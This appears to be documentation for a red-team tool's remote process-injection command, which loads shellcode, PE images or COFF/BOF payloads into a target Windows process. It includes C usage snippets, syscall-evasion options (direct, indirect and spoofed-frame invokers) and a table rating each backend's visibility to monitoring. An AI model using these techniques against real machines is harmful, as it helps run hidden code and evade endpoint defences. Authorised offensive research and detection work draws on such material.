# `unified inject classic` — Remote Injection

**Implementation:** `pocs/src/cmd_inject_classic.c`
**Syntax:** `unified inject classic {shell|pe|coff} -f <payload> -p <pid> [options]`

Injects into an existing process. Each mode runs the same **Open → Alloc → Write → Protect → Execute** pipeline with a different payload preparation strategy.

## Modes

| Mode | Chain entry point | Local preparation | Execute |
|---|---|---|---|
| `shell` | `snd_inj_classic_shell` | None; file bytes are executed as shellcode | Remote thread at the allocation base |
| `pe` | `snd_inj_classic_pe` | Reflective PE bake (relocations + imports) against the remote base | Remote thread at `AddressOfEntryPoint` |
| `coff` | `snd_inj_classic_coff` | COFF section copy + BOF symbol resolution + relocations | Remote thread at the resolved BOF entry |

## Options

```text
  -f <path>            Payload path (required).
  -p <pid>             Target process ID (required; decimal or 0x hex).
  -e <name>            [coff] BOF entry symbol (default: "go").
  -a <args>            [coff] Single argument string passed to the BOF.
  --win                Win32 backend for loader + injector.
  --nt                 Native backend for loader + injector (default).
  --sys                Syscall backend for loader + injector.
  --invoke-direct      Syscall invoker: direct assembly.
  --invoke-indirect    Syscall invoker: indirect assembly (default).
  --invoke-spoofed     Syscall invoker: spoofed frame assembly.
  --resolve-scan       SSN resolver: in-memory scan (default).
  --resolve-sort       SSN resolver: export-table sort.
```

> [!NOTE]
> `-e` and `-a` are only consumed by `coff`. In `shell` and `pe` modes they are parsed and ignored.

## Backends

| Backend | Memory | Modules | Process | File | Syscall bootstrap |
|---|---|---|---|---|---|
| `--win` | `snd_mem_win` | `snd_mod_win` | `snd_proc_win` | `snd_file_win` | None |
| `--nt` | `snd_mem_nt` | `snd_mod_nt` | `snd_proc_nt` | `snd_file_nt` | None |
| `--sys` | `snd_mem_sys` | `snd_mod_nt` | `snd_proc_sys` | `snd_file_sys` | KnownDlls clean `ntdll` + `apply_syscall_style` |

Classic injection creates remote threads via `proc_api->create_remote_thread`. The dedicated `thread_api` tables (`snd_thread_*`) are only used by the APC and hijack chains, documented in [inject_apc.md](inject_apc.md).

`--nt`/`--sys` require an absolute payload path. Default backend is `--nt`; default syscall invoker is indirect.

## Walkthrough

### 1. Bind the backend and load the payload

```c
unified_backend_t be = {0};
unified_backend_init(backend, &scfg, &be);  // API_SYS also bootstraps KnownDlls ntdll

snd_buffer_t file_buf = {0};
unified_file_load(&be, file_path, &file_buf);
```

The bound `be.mem_api`, `be.mod_api`, and `be.proc_api` tables are what the chains below inject.

### 2a. Shellcode mode

```c
snd_inj_ctx_t inj = {0};
inj.target_pid = target_pid;
inj.payload    = &file_buf;
inj.proc_api   = be.proc_api;

snd_inj_classic_shell(&inj);
snd_inj_cleanup(&inj);
```

The whole file is treated as executable shellcode: the remote thread starts at the allocation base.

### 2b. PE mode

```c
snd_ldr_pe_ctx_t ldr = {0};
snd_inj_ctx_t    inj = {0};

ldr.mem_api    = be.mem_api;
ldr.mod_api    = be.mod_api;
ldr.raw_source = &file_buf;
inj.target_pid = target_pid;
inj.proc_api   = be.proc_api;

snd_inj_classic_pe(&ldr, &inj);

snd_inj_cleanup(&inj);
snd_ldr_pe_free_mapped_image(&ldr);
```

The chain interleaves local loader fixups with remote allocation:

1. Parse the PE and allocate/copy the image locally.
2. Open the target and allocate a remote RW region.
3. Point the loader at the remote base, then apply relocations and resolve imports locally.
4. Write the baked image to the target.
5. Protect the region RX and set the remote entry to the entry-point VA.
6. Create the remote thread.

The remote thread starts at `AddressOfEntryPoint` (typically `DllMain` for DLL payloads). The chain does **not** run the loader's local TLS/DllMain path.

### 2c. COFF mode

```c
snd_ldr_coff_ctx_t ldr = {0};
snd_inj_ctx_t      inj = {0};

ldr.mem_api    = be.mem_api;
ldr.mod_api    = be.mod_api;
ldr.raw_source = &file_buf;
inj.target_pid = target_pid;
inj.proc_api   = be.proc_api;

snd_inj_classic_coff(&ldr, &inj, "go", bof_args, bof_arg_len);

snd_inj_cleanup(&inj);
snd_ldr_coff_free_mapped_image(&ldr);
```

`bof_args` is the raw `-a` string and `bof_arg_len` is `strlen + 1`.

## What these chains do not do

- No per-section remote protections; PE mode uses a flat `PAGE_EXECUTE_READ` on the image.
- No TLS callbacks in the remote PE path.
- No suspension or process creation — `inject apc` covers the spawn-suspended flow.

## OpSec impact

| Backend | Remote telemetry |
|---|---|
| `--win` | `OpenProcess`/`VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` — high visibility; useful for validating the state machine |
| `--nt` | Native process/thread/memory calls; in-process `ntdll` hooks may fire |
| `--sys` | Remote operations bypass userland stubs; module resolution still uses PEB + EAT |

The injection stage is tracked in `snd_inj_ctx_t.stage`; on failure the command prints the status context through the shared status system (meaningful when `SND_ENABLE_DEBUG=ON`).

## See also

- [Injection internals](../injection/internals.md)
- [inject_apc.md](inject_apc.md) — early-bird variant that spawns its own target and uses the thread API for APC queueing
- [load_pe.md](load_pe.md) — the local reflective pipeline in isolation
- [cli.md](cli.md) — backend and syscall strategy reference
